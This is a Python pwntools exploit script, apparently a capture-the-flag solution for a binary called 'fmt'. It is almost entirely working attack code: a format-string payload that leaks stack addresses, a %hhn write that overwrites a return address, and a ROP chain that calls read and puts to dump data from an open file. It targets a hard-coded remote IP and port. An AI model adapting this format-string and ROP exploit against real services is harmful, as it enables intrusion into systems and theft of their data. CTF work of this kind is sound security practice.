#! /usr/bin/python2

from pwn import *
import sys


def exploit():
    gdb_command = '''
        b *0x400B16
    '''
    SIGN = 'THE_END'
    fmt = '%p'*36 + SIGN + '%p'
    r.sendline(fmt)
    r.recvuntil(SIGN)
    raw = r.recv(14)
    buff_addr = int(raw, 16) - 496
    ret_addr = buff_addr - 8
    log.info(hex(buff_addr))

    # r.recvuntil(SIGN)
    # raw = r.recv(14)
    # libc_start_main = int(raw, 16) - 267
    # libc_addr = libc_start_main - 0x20740
    # log.info('Libc addr: ' + hex(libc_addr))

    # 0x400BCC                 retn
    # 0000000000400B44                 retn
    # 0x0000000000400bb3 : pop rdi ; ret
    # 0x0000000000400bb1 : pop rsi ; pop r15 ; ret
    wb = 0xa6
    
    poprdi_addr = 0x400bb3
    poprsi_addr = 0x400bb1
    read_plt_addr = 0x400820
    puts_plt_addr = 0x4007F0
    rop = p64(poprdi_addr) + p64(0x3) + p64(poprsi_addr) + p64(0x601100) + p64(0) + p64(read_plt_addr)
    rop += p64(poprdi_addr) + p64(0x601100) + p64(puts_plt_addr)

    fmt = '%' + '%i' % wb + 'p%11$hhn' + '%p' * 11 + '\n'
    fmt = fmt.ljust(48, '\x00') + p64(ret_addr) + rop
    # gdb.attach(r, gdb_command)
    r.sendline(fmt)

    r.interactive()



if __name__ == '__main__':
    context.terminal = ['gnome-terminal', '-e']
    if len(sys.argv) == 1:
        exit()
    if sys.argv[1] == 'remote':
        r = remote('18.136.126.78', 1335)
        LOCAL = False
    elif sys.argv[1] == 'local':
        r = process('./fmt', env={'LD_PRELOAD': './libc-2.23.so'})
        LOCAL = True
    else:
        exit()
    exploit()
